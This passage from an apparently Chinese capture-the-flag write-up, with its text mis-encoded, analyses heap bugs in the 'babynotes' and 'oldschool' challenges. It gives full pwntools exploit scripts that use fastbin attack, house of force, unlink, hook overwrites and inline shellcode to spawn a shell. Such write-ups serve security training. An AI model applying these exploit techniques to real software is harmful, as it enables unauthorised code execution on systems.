†å¯¹åº”çš„sizeä½æœ‰æ²¡æœ‰æ•°å€¼ï¼ˆä¹Ÿé€‚ç”¨äºshownoteï¼Œdeletenote,editnoteï¼‰<h4 id="deletenote"><a href="#deletenote" class="headerlink" title="deletenote()"></a>deletenote()</h4></li></ul><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">3</span> )                                <span class="hljs-comment">// å¯ä»¥è¾“å…¥è´Ÿæ•°</span>  &#123;    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;m[<span class="hljs-number">4</span> * (v1 + <span class="hljs-number">0xA</span>LL)] )    &#123;      <span class="hljs-built_in">free</span>(*(<span class="hljs-keyword">void</span> **)&amp;m[<span class="hljs-number">4</span> * (v1 + <span class="hljs-number">4L</span>L)]);<span class="hljs-comment">// åç¼–è¯‘é”™äº† æ˜¯8 *ï¼ˆxxï¼‰</span>      *(_QWORD *)&amp;m[<span class="hljs-number">4</span> * (v1 + <span class="hljs-number">0xA</span>LL)] = <span class="hljs-number">0L</span>L;<span class="hljs-comment">//uaf heapæ²¡æœ‰æ¸…0,size æ¸…0</span>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done!"</span>);    &#125;</code></pre></div><ul><li>å­˜åœ¨uaf</li><li>åªèƒ½åˆ é™¤<code>idx&lt;=3</code> çš„å †</li><li>å¯ä»¥è¾“å…¥è´Ÿå †å·ï¼Œå¯ä»¥æ ¹æ®å…¶é€»è¾‘æ¥åˆ é™¤ä¸€äº›ç‰¹æ®Šçš„å †</li></ul><h4 id="editnote"><a href="#editnote" class="headerlink" title="editnote()"></a>editnote()</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">3</span> &amp;&amp; v1 &gt;= <span class="hljs-number">0</span> )</code></pre></div><ul><li>åªèƒ½ç¼–è¾‘å‰4ä¸ªå †</li></ul><h3 id="æ”»å‡»æ€è·¯-1"><a href="#æ”»å‡»æ€è·¯-1" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><ul><li>leak libc</li><li>free(-1) free(-2) åˆ é™¤æ‰motto nameçš„å †å—</li><li>åˆ©ç”¨resetï¼Œè°ƒç”¨registï¼Œåˆ©ç”¨strcpyæ¥æº¢å‡ºageçš„æ•°å€¼ï¼Œæ§åˆ¶ç¬¬ä¸€ä¸ªchunkçš„sizeï¼Œé€ æˆä¸€ä¸ªå †å—é‡å </li><li>åˆ é™¤0ã€1ã€2chunkï¼Œç”³è¯·ä¸€ä¸ªå¤§çš„chunkï¼Œå¯ä»¥è¦†ç›–åˆ°chunk 1çš„fdä»è€Œä¿®æ”¹ï¼Œè¿›è¡Œfastbin attack</li><li>æ‰“malloc hook ä¸º one gadget</li></ul><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./babynotes'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reg</span><span class="hljs-params">(name,motto,age)</span>:</span>    sa(<span class="hljs-string">'name'</span>,str(name))    sa(<span class="hljs-string">'motto'</span>,str(motto))    sla(<span class="hljs-string">'age'</span>,str(age))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'size'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)    <span class="hljs-comment"># if int(idx) &lt;=3:</span>    sla(<span class="hljs-string">'dex'</span>,str(idx))    <span class="hljs-comment"># if int(idx) &gt;3:</span>        <span class="hljs-comment"># idx = </span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'note'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reset</span><span class="hljs-params">(name,motto,age)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'5'</span>)    reg(name,motto,age)name = <span class="hljs-string">'a'</span> * <span class="hljs-number">0x18</span>motto = <span class="hljs-string">'b'</span> * <span class="hljs-number">0x20</span>age = <span class="hljs-number">0x100</span>reg(name,motto,age)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x58</span>) add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>) add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0x100</span>) add(<span class="hljs-number">4</span>,<span class="hljs-number">0x18</span>) free(<span class="hljs-number">3</span>)add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>)show(<span class="hljs-number">5</span>)ru(<span class="hljs-string">'ote 5: '</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4c78</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)free(<span class="hljs-number">-1</span>)free(<span class="hljs-number">-2</span>)age = <span class="hljs-number">0x1111111100000141</span>reset(name,<span class="hljs-string">' '</span>,age)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>)malloc_hook = <span class="hljs-number">0x3c4aed</span> + libc_basepayload = <span class="hljs-number">11</span> * p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(malloc_hook)edit(<span class="hljs-number">0</span>,payload)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x68</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)one = <span class="hljs-number">0xf0364</span> + libc_basepayload = (<span class="hljs-number">0x13</span><span class="hljs-number">-8</span>) * <span class="hljs-string">'1'</span> + p64(<span class="hljs-number">0</span>) + p64(one)edit(<span class="hljs-number">3</span>,payload)free(<span class="hljs-number">3</span>)itr()</code></pre></div><p>è¿˜æœ‰ä¸€ç§æ€è·¯ï¼Œå°±æ˜¯å› ä¸ºbssæ®µçš„ageï¼Œfreeï¼ˆ-3ï¼‰ä¹Ÿå¯ä»¥è¿›è¡Œfreeçš„ï¼Œæ§åˆ¶å…¶ä¸ºä¸€ä¸ª0x68å †å—åœ°å€çš„è¯ï¼Œå°±å¯ä»¥å‡ºç°ä¸€ä¸ª0x70çš„fastbinå—ï¼Œç„¶åå…¶sizeæ˜¯ä¸ä¼šåŒ—æŠ¹é™¤çš„ï¼Œæ‰€ä»¥åˆ©ç”¨uafç›´æ¥editå…¶fdä¸ºmalloc hookï¼Œfastbin attack æ”»å‡»å³å¯ã€‚</p><h3 id="å¦ä¸€ç§æ‰“æ³•"><a href="#å¦ä¸€ç§æ‰“æ³•" class="headerlink" title="å¦ä¸€ç§æ‰“æ³•"></a>å¦ä¸€ç§æ‰“æ³•</h3><h4 id="addnote-1"><a href="#addnote-1" class="headerlink" title="addnote()"></a>addnote()</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">"Input note size: "</span>);   __isoc99_scanf(<span class="hljs-string">"%lld"</span>, &amp;size);   <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">signed</span> __int64)size &lt;= <span class="hljs-number">0x100</span> )   &#123;</code></pre></div><p>è¿™é‡Œæœ‰ä¸ªé—æ¼ç‚¹ï¼Œaddçš„sizeæ˜¯å¯ä»¥è¾“å…¥è´Ÿçš„</p><h4 id="house-of-forceä½¿ç”¨æ¡ä»¶"><a href="#house-of-forceä½¿ç”¨æ¡ä»¶" class="headerlink" title="house of  forceä½¿ç”¨æ¡ä»¶"></a>house of  forceä½¿ç”¨æ¡ä»¶</h4><p>æ¯”èµ›æ—¶æ²¡æœ‰æƒ³åˆ°ï¼Œå› ä¸ºhouse of  forceç›¸å…³çš„æœ‰ç‚¹é—å¿˜äº†ã€‚</p><ul><li>å¯ä»¥æº¢å‡ºåˆ°top chunkçš„ sizeï¼Œç¯¡æ”¹ size ä¸ºä¸€ä¸ªå¾ˆå¤§å€¼,å°±å¯ä»¥è½»æ¾çš„é€šè¿‡top chunkçš„ç›¸å…³éªŒè¯ï¼Œå¸¸è§å°±æ˜¯ä¿®æ”¹ä¸º <code>-1</code> </li><li>å¯ä»¥ç”³è¯·ä»»æ„sizeçš„å †å—ï¼Œæ­£è´Ÿéƒ½è¡Œï¼Œä½†æ˜¯æœ‰ä¸åŒçš„æ”»å‡»é™åˆ¶</li></ul><p>è¿™é¢˜æ˜¯å¯ä»¥æ»¡è¶³çš„:</p><ul><li>åˆ©ç”¨strcpyæ¥æº¢å‡ºageçš„æ•°å€¼ ï¼Œå¾ˆç®€å•çš„æ§åˆ¶top chunkçš„ size</li><li>å¯ä»¥ç”³è¯·è´Ÿçš„å †å—ï¼Œè´Ÿçš„å †å—å¯ä»¥æ‰“heap æˆ–è€… got ï¼Œè·å–ä¸€ä¸ªä»»æ„åœ°å€å†™,<strong>é€šå¸¸åº”è¯¥éƒ½æ˜¯æ‰“heap</strong></li></ul><h4 id="æ”»å‡»æ€è·¯-2"><a href="#æ”»å‡»æ€è·¯-2" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h4><ul><li>ä¿®æ”¹top chunkçš„size</li><li>åˆ©ç”¨house of  forceï¼Œå°†top chunkå‘å‰ç§»åŠ¨ï¼Œä½¿å¾—å…¶ä¸ç°æœ‰çš„chunké‡åˆ</li><li>ç„¶åé€šè¿‡mallocä¸€ä¸ªå°å †å—ï¼Œæ„é€ å¥½ fake chunkï¼Œæ§åˆ¶ç°æœ‰å †çš„sizeå’Œprev_sizeå_</li><li>åšunlinkï¼Œå®ç°ä»»æ„åœ°å€è¯»å†™ã€‚</li></ul><h4 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *sh = process(<span class="hljs-string">'./babynotes'</span>)<span class="hljs-comment"># sh = remote('123.56.170.202',43121)</span>elf = ELF(<span class="hljs-string">'./babynotes'</span>)libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)free_got = elf.got[<span class="hljs-string">'free'</span>]<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(sh)    pause()context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]sh.sendafter(<span class="hljs-string">'Input your name:'</span>,<span class="hljs-string">'haivk'</span>)sh.sendafter(<span class="hljs-string">'Input your motto:'</span>,<span class="hljs-string">'pwnit'</span>)sh.sendlineafter(<span class="hljs-string">'Input your age:'</span>,<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(index,size)</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)   sh.sendlineafter(<span class="hljs-string">'Input index:'</span>,str(index))   sh.sendlineafter(<span class="hljs-string">'Input note size:'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)   sh.sendlineafter(<span class="hljs-string">'Input index:'</span>,str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(index)</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)   sh.sendlineafter(<span class="hljs-string">'Input index:'</span>,str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(index,content)</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)   sh.sendlineafter(<span class="hljs-string">'Input index:'</span>,str(index))   sh.sendafter(<span class="hljs-string">'Input your note:'</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reset</span><span class="hljs-params">()</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'5'</span>)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x100</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x100</span>)reset()sh.sendafter(<span class="hljs-string">'Input your name:'</span>,<span class="hljs-string">'haivk'</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">'a'</span>))sh.sendafter(<span class="hljs-string">'Input your motto:'</span>,<span class="hljs-string">'pwnit'</span>)sh.sendlineafter(<span class="hljs-string">'Input your age:'</span>,<span class="hljs-string">'-1'</span>)add(<span class="hljs-number">4</span>,<span class="hljs-number">-0x370</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0x20</span>)<span class="hljs-comment">#top chunkä¸Šç§»</span>edit(<span class="hljs-number">3</span>,p64(<span class="hljs-number">0x100</span>) + p64(<span class="hljs-number">0x110</span>))heap0_ptr_addr = <span class="hljs-number">0x6020E0</span>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + p64(heap0_ptr_addr - <span class="hljs-number">0x18</span>) + p64(heap0_ptr_addr - <span class="hljs-number">0x10</span>))debug()<span class="hljs-comment">#unlink</span>delete(<span class="hljs-number">1</span>)debug()edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(free_got))show(<span class="hljs-number">0</span>)sh.recvuntil(<span class="hljs-string">'Note 0: '</span>)free_addr = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))libc_base = free_addr - libc.sym[<span class="hljs-string">'free'</span>]system_addr = libc_base + libc.sym[<span class="hljs-string">'system'</span>]edit(<span class="hljs-number">0</span>,p64(system_addr))edit(<span class="hljs-number">2</span>,<span class="hljs-string">'/bin/sh\x00'</span>)<span class="hljs-comment">#getshell</span>delete(<span class="hljs-number">2</span>)sh.interactive()</code></pre></div><p>exp æ¥è‡ª haivk å¤§å¸ˆå‚…ã€‚</p><h2 id="oldschool"><a href="#oldschool" class="headerlink" title="oldschool"></a>oldschool</h2><h3 id="åˆ†æ-5"><a href="#åˆ†æ-5" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç»™äº†æºç ï¼Œåˆ†æç¨‹åºå¸¦æ¥äº†å¾ˆå¤§çš„ä¾¿åˆ©ã€‚<br>ä¼šå‘ç°å¾ˆå¤šåœ°æ–¹å¯¹sizeå¤§å°éªŒè¯ä¸æ˜¯å¾ˆå¤šï¼Œæ˜¯è´Ÿæ•°ä¹Ÿè¡Œï¼Œä½†æ˜¯å¯¹æ­¤é¢˜çš„æ”»å‡»ï¼Œç”¨é€”å¹¶ä¸å¤§ã€‚</p><div class="hljs"><pre><code class="hljs c">g_ptr =  mmap(ADDR_LOW + idx, ADDR_HIGH - ADDR_LOW - idx, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);</code></pre></div><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ç”³è¯·çš„mmapåŒºï¼Œæ˜¯å¯ä»¥è¿›è¡Œæ‰§è¡Œçš„ï¼Œå¯ä»¥è€ƒè™‘ä¸€ä¸‹shellcodeã€‚</p><h4 id="æ¼æ´ç‚¹-2"><a href="#æ¼æ´ç‚¹-2" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mmap_edit</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">if</span>(g_ptr == <span class="hljs-literal">NULL</span>)&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Mmap first!"</span>);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-keyword">unsigned</span> value;    <span class="hljs-keyword">unsigned</span> idx;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);    idx = get_int();         <span class="hljs-keyword">if</span>(g_ptr + idx &lt; g_ptr &amp;&amp; (<span class="hljs-keyword">unsigned</span>)(g_ptr + idx) &lt; ADDR_HIGH)&#123;        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid idx"</span>);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Value: "</span>);    value = get_int();     g_ptr[idx] = value;&#125;</code></pre></div><p>å¯ä»¥çœ‹åˆ°å…¶å¯¹<code>g_ptr + idx</code>çš„éªŒè¯æ˜¯å¾ˆç®€å•çš„ï¼Œç»™è¶³å¤§çš„åç§»ï¼Œå¯ä»¥æ”¹åˆ°libcçš„ã€‚æ˜¯ä¸€ä¸ªæ•°ç»„æº¢å‡ºã€‚</p><h3 id="æ”»å‡»æ€è·¯-3"><a href="#æ”»å‡»æ€è·¯-3" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h3><h4 id="æ€è·¯1"><a href="#æ€è·¯1" class="headerlink" title="æ€è·¯1:"></a>æ€è·¯1:</h4><ul><li>å…ˆæ­£å¸¸åˆ†é…ï¼Œæ³„æ¼å‡ºlibcåœ°å€</li><li>åˆ†é…ä¸€ä¸‹mmapï¼Œåˆ©ç”¨æ•°ç»„æº¢å‡ºï¼Œè¿›è¡Œä¿®æ”¹<code>malloc_hook</code>ï¼Œä¸ºmmapçš„åœ°å€ã€‚</li><li>åœ¨mmapçš„å†…å­˜ä¸Šå¡«ä¸Šshellcode</li></ul><h4 id="æ€è·¯2"><a href="#æ€è·¯2" class="headerlink" title="æ€è·¯2:"></a>æ€è·¯2:</h4><ul><li>å…ˆæ­£å¸¸åˆ†é…ï¼Œæ³„æ¼å‡ºlibcåœ°å€</li><li>åˆ†é…ä¸€ä¸‹mmapï¼Œåˆ©ç”¨æ•°ç»„æº¢å‡ºï¼Œè¿›è¡Œä¿®æ”¹<code>free_hook</code>ï¼Œä¸ºsystemã€‚</li><li>free ä¸€ä¸ª å¸¦æœ‰<code>/bin/sh</code>çš„chunkå³å¯</li></ul><p>è¿™ä¸ªæ›´å¥½ç‚¹ã€‚</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ize'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mmap_add</span><span class="hljs-params">(addr)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'6'</span>)    sla(<span class="hljs-string">'start'</span>,str(addr))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mmap_edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'7'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'lue'</span>,str(data))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    add(i,<span class="hljs-number">0x90</span>)add(<span class="hljs-number">9</span>,<span class="hljs-number">0x10</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i)free(<span class="hljs-number">7</span>)add(<span class="hljs-number">10</span>,<span class="hljs-number">0x10</span>)show(<span class="hljs-number">10</span>)ru(<span class="hljs-string">'ent: '</span>)libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1d8828</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)system = <span class="hljs-number">0x3d200</span> + libc_basefree_hook = <span class="hljs-number">0x1d98d0</span> + libc_basemmap_add(<span class="hljs-number">0</span>)<span class="hljs-string">'''# one wayoffset = ((libc_base+0x1d8788 - 0xe0000000)) / 4mmap_edit(offset,'3758096384')shellcode = '\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80'shellcode = [int(0xd231c931),int(0x2f2f6852),int(0x2f686873),int(0x896e6962),int(0xb0c031e3),int(0x80cd0b)]for i in range(len(shellcode)):    mmap_edit(i,shellcode[i])add(13,0x10)'''</span><span class="hljs-comment"># two way</span>offset = ((free_hook - <span class="hljs-number">0xe0000000</span>)) / <span class="hljs-number">4</span>mmap_edit(offset,int(system))edit(<span class="hljs-number">9</span>,<span class="hljs-string">'/bin/sh\x00'</span> + <span class="hljs-string">'\n'</span>)free(<span class="hljs-number">9</span>)itr()</code></pre></div><h2 id="direct"><a href="#direct" class="headerlink" title="direct"></a>direct</h2><h3 id="åˆ†æ-6"><a href="#åˆ†æ-6" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><h4 id="addå‡½æ•°"><a href="#addå‡½æ•°" class="headerlink" title="addå‡½æ•°"></a>addå‡½æ•°</h4><ul><li><p>ç”³è¯·çš„chunkæœ€å¤§å€¼ä¸º0x100,maxä¸º16ä¸ª</p></li><li><p>sizeå¯ä»¥ä¸ºè´Ÿå€¼</p><h4 id="editå‡½æ•°"><a href="#editå‡½æ•°" class="headerlink" title="editå‡½æ•°"></a>editå‡½æ•°</h4></li><li><p>offset, size éƒ½å¯ä»¥ä¸ºè´Ÿå€¼</p></li><li><p><code>read(0, (void *)(heaplist[idx] + offset), nbytes);</code> è¿™é‡Œå­˜åœ¨è´Ÿæº¢å‡ºï¼Œå¯ä»¥ä¿®æ”¹ä¸Šä¸€ä¸ªchunké‡Œé¢çš„å€¼</p></li></ul><h4 id="open-fileå‡½æ•°"><a href="#open-fileå‡½æ•°" class="headerlink" title="open fileå‡½æ•°"></a>open fileå‡½æ•°</h4><ul><li>åªèƒ½è°ƒç”¨ä¸€æ¬¡ï¼Œè°ƒç”¨åå¯ä»¥è¿›è¡Œedit chunk</li></ul><h4 id="close-å‡½æ•°"><a href="#close-å‡½æ•°" class="headerlink" title="close å‡½æ•°"></a>close å‡½æ•°</h4><div class="hljs"><pre><code class="hljs c">result = (<span class="hljs-keyword">ssize_t</span>)readdir(dirp);    v1 = result;    <span class="hljs-keyword">if</span> ( result )    &#123;      put(<span class="hljs-string">"Filename: "</span>);      result = put2(v1 + <span class="hljs-number">0x13</span>);</code></pre></div><p>è¿›è¡Œæ‰“å°æ–‡ä»¶åã€‚</p><p>å¯ä»¥çœ‹åˆ°æ¼æ´ç‚¹å°±æ˜¯åœ¨edité‚£é‡Œï¼Œä¸”æ²¡æœ‰showå‡½æ•°ã€‚leak libcæ˜¯æ­¤é¢˜çš„éš¾ç‚¹ã€‚å› ä¸ºæ˜¯æ²¡æœ‰putså‡½æ•°è¿›è¡Œè¾“å‡ºï¼Œæ‰€ä»¥æ”»å‡»stdoutä¹Ÿæ²¡æœ‰ç”¨ã€‚</p><p><strong>é‡ç‚¹æ˜¯äº†è§£opendir å’Œ readdirã€‚</strong><br>å‚è€ƒé“¾æ¥ï¼š<br><a href="https://blog.csdn.net/cainiao000001/article/details/80988738" target="_blank" rel="noopener">https://blog.csdn.net/cainiao000001/article/details/80988738</a></p><p>å¯ä»¥å‘ç°ï¼Œåœ¨è°ƒç”¨opendirå’Œreaddiråï¼Œæ–‡ä»¶åæ˜¯å­˜åœ¨äºå†…å­˜ä¸­çš„ã€‚ç„¶åå› 